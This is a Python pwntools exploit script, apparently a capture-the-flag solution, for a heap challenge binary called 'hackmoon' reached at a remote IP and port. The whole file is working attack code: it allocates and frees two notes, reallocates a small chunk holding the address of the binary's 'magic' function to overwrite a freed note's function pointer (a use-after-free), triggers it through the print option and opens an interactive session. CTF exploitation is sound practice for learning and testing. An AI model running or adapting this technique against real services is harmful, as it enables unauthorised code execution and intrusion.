from pwn import *
context.log_level = "debug"
# p = process("./hackmoon")
p = remote("101.71.29.5" , 10016)
elf = ELF("./hackmoon")

cmd = lambda c : p.sendlineafter("Your choice :" , str(c))
def add(size , content):
	cmd(1)
	p.sendafter("moon size :" , str(size))
	p.sendafter("Content :" , content)

def delete(index):
	cmd(2)
	p.sendafter("Index :" , str(index))

def print_func(index):
	cmd(3)
	p.sendafter("Index :" , str(index))

add(0x10 , "fantasy")
add(0x10 , "fantasy")
delete(0)
delete(1)
add(0x8 , p32(elf.sym["magic"]))
print_func(0)
p.interactive()